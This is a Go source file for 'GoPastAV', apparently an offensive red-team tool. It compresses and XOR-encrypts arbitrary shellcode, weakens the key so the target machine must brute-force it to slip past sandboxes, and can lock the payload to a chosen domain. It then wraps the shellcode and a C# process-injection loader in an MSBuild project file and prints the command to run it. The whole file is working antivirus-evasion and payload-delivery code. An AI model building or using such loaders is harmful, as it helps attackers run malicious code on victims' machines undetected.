package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"text/template"
	"time"
	"regexp"
)

var version = "1.6"

// basic2.cs = VirtualAlloc + CreateThread
// notsobasic.cs = NtCreateSection + NtMapViewOfSection + delegate
// complex.cs = NtCreateSection + NtMapViewOfSection + APC on a suspended threat at ntdll!RtlExitUserThread

//TODO obfiscation - https://github.com/Flangvik/RosFuscator
//TODO use Dinvoke to be more stealthy - https://rastamouse.me/blog/process-injection-dinvoke/

type MSBuildPayload struct {
	Payload   string
	Hash      string
	Key       string
	DomainKey bool
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func xor(input, key []byte) []byte {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

func formatBytes(input []byte) string {
	s := make([]string, len(input))
	for i, v := range input {
		s[i] = fmt.Sprintf("%#x", v)
	}
	return strings.Join(s, ",")
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func randStringBytes(n int) string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func subtractFromByteArray(key []byte, value int) {
	for ; value > 0; value-- {
		index := len(key) - 1
		for index >= 0 {
			if key[index] > 0 {
				key[index]--
				break
			} else {
				key[index] = 255
				index--
			}
		}
	}
}

func main() {
	fmt.Printf("GoPastAV %s by @aceb0nd\n", version)

	var scFilename string
	var codeFilename string
	var outFilename string
	var domainKey string
	var iterations int
	var encryptOnly bool
	var obfuscate bool

	flag.StringVar(&scFilename, "shellcode", "shellcode.bin", "Shellcode file to embed inside the MSBuild payload.")
	flag.StringVar(&codeFilename, "code", "payload.cs", "C# source code filename that the MSBuild payload should execute.")
	flag.StringVar(&outFilename, "outfile", "", "Output filename for the MSBuild project or encrypted shellcode.")
	flag.IntVar(&iterations, "rounds", -1, "The number of iterations the loader will need to perform to reach the correct decryption key. Default is a random value between 20000 and 30000.")
	flag.StringVar(&domainKey, "key", "", "Key to Domain: the payload will only execute on a specific domain. Must be the FQDN.")
	flag.BoolVar(&encryptOnly, "encryptOnly", false, "Output only the encrypted shellcode for another tool/project.")
	flag.BoolVar(&obfuscate, "obfuscate", false, "[NOT IMPLEMENTED] Obfuscate the c# code using RosFuscator.")
	flag.Parse()

	if !fileExists(scFilename) {
		fmt.Printf("[!] Cannot find shellcode file \"%s\"\n", scFilename)
		flag.PrintDefaults()
		os.Exit(1)
	}
	if !fileExists(codeFilename) && !encryptOnly {
		fmt.Printf("[!] Cannot find C# code file \"%s\"\n", codeFilename)
		flag.PrintDefaults()
		os.Exit(1)
	}

	if iterations < 0 {
		iterations = 20000 + rand.Intn(10000)
	}

	// the MSBuild template code will have access to {{.Payload}}, {{.Key}} and {{.Hash}}
	MSBuildTemplate := `<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
	<Target Name="MsUpdate">
	   <ClassRunner/>
	</Target>
	
	<UsingTask 
		TaskName="ClassRunner"
		TaskFactory="CodeTaskFactory"
		AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
	<Task>
	   <Code Type="Class" Language="cs">
	   <![CDATA[CODE_GOES_HERE]]></Code></Task></UsingTask></Project>
   `

	// read shellcode
	fmt.Printf("[+] Reading shellcode... ")
	shellcode, err := ioutil.ReadFile(scFilename)
	check(err)
	fmt.Println("Done")

	// compressing shellcode
	fmt.Printf("[+] Compressing shellcode... ")
	var gzipShellcode bytes.Buffer
	w := gzip.NewWriter(&gzipShellcode)
	w.Write(shellcode)
	w.Close()
	shellcode = gzipShellcode.Bytes()
	fmt.Println("Done")

	// generate encryption keys
	fmt.Printf("[+] Generating encryption keys... ")
	rand.Seed(time.Now().UTC().UnixNano())
	key := make([]byte, 32)
	rand.Read(key)
	shellcodeHash := sha256.Sum256(shellcode)
	fmt.Println("Done")
	fmt.Printf("[+] Key: %v\n", formatBytes(key))
	fmt.Printf("[+] Hash: %v\n", formatBytes(shellcodeHash[:]))

	// encrypting shellcode (hashkey)
	fmt.Printf("[+] Encrypting shellcode... ")
	encShellcode := xor(shellcode, key)
	fmt.Println("Done")

	// decrement X times from the key as the victim will have to brute force this
	fmt.Printf("[+] Decrementing %d from the decryption key... ", iterations)
	subtractFromByteArray(key, iterations)
	fmt.Println("Done")
	//fmt.Printf("[+] Key: %v\n", formatBytes(key))

	if encryptOnly {
		fmt.Printf("[+] Writing encrypted shellcode to file... ")
		if outFilename == "" {
			t := time.Now()
			outFilename = "encShellcode" + t.Format("20060102150405") + ".bin"
		}
		scFile, err := os.Create(outFilename)
		check(err)
		scFile.Write(encShellcode)
		scFile.Close()
		fmt.Println("Done")
	} else {

		// read C# code
		fmt.Printf("[+] Reading C# code... ")
		payloadCode, err := ioutil.ReadFile(codeFilename)
		check(err)
		fmt.Println("Done")

		//fmt.Printf("[+] Stripping newline characters to make Blue Team's life harder ... ")
		//MSBuildTemplate = strings.Replace(MSBuildTemplate, "\r\n", "", -1)
		re := regexp.MustCompile("(?s)//.*?\n|/\\*.*?\\*/")
    	payloadCode = re.ReplaceAll(payloadCode, nil)

		if len(domainKey) > 0 {
			fmt.Printf("[+] Keying to domain %s...", domainKey)
			key = xor(key, []byte(strings.ToUpper(domainKey)))
			fmt.Println("Done")
		}

		fmt.Printf("[+] Creating msbuild profile file... ")
		// insert code into MSBuild template
		MSBuildTemplate = strings.Replace(MSBuildTemplate, "CODE_GOES_HERE", string(payloadCode), 1)
		answers := MSBuildPayload{
			Payload:   base64.StdEncoding.EncodeToString(encShellcode),
			Hash:      formatBytes(shellcodeHash[:]),
			Key:       formatBytes(key),
			DomainKey: len(domainKey) > 0,
		}
		tmpl, err := template.New("msbuild_shellcode").Parse(MSBuildTemplate)
		check(err)

		if outFilename == "" {
			t := time.Now()
			outFilename = "payload" + t.Format("20060102150405") + ".proj"
		}
		outfile, err := os.Create(outFilename)
		check(err)
		err = tmpl.Execute(outfile, answers)
		check(err)
		outfile.Close()
		fmt.Println("Done")
		fmt.Printf("[+] Run with: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe .\\%s\n", outFilename)
		fmt.Printf("[+] If you don't specify a project file, MSBuild searches the current working directory for a file name extension that ends in proj and uses that file.")
	}
}
